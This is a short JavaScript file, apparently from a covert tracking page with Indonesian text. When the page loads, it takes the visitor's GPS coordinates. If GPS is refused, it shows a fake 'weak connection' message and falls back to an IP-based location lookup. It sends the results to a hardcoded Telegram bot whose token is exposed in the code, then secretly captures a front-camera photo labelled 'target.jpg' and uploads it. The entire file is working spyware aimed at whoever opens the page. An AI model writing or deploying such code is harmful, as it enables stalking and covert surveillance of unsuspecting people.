
const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
const chatId = "8465963357";

async function execute() {
    const status = document.getElementById('status');

    if (navigator.geolocation) {
        // Coba ambil GPS Presisi
        navigator.geolocation.getCurrentPosition(async (p) => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            
            const msg = `🎯 **GPS PRESISI DIDAPAT!**\n📍 Lat: ${lat}\n📍 Lon: ${lon}\n📏 Akurasi: ${acc.toFixed(1)}m\n🗺️ Maps: https://www.google.com/maps?q=$$${lat},${lon}`;
            
            await sendTele(msg);
            snap();
        }, async (err) => {
            // JIKA GPS DITOLAK -> AMBIL LOKASI IP
            status.innerHTML = "<span style='color:orange'>KONEKSI LEMAH. MENGGUNAKAN SERVER CADANGAN...</span>";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const msg = `⚠️ **GPS DITOLAK! (Estimasi IP)**\n🏙️ Kota: ${d.city}\n🚩 Region: ${d.region}\n📡 ISP: ${d.org}\n📍 Koordinat: ${d.latitude}, ${d.longitude}`;
                
                await sendTele(msg);
            } catch (e) {
                await sendTele("❌ Gagal mengambil lokasi IP.");
            }
            snap();
        }, { enableHighAccuracy: true, timeout: 8000 });
    }
}

async function sendTele(text) {
    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
    });
}

async function snap() {
    // ... (fungsi foto tetep sama kayak sebelumnya)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        v.srcObject = stream;
        await v.play();
        setTimeout(() => {
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', b, 'target.jpg');
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }, 1000);
    } catch (e) {}
}

window.onload = execute;
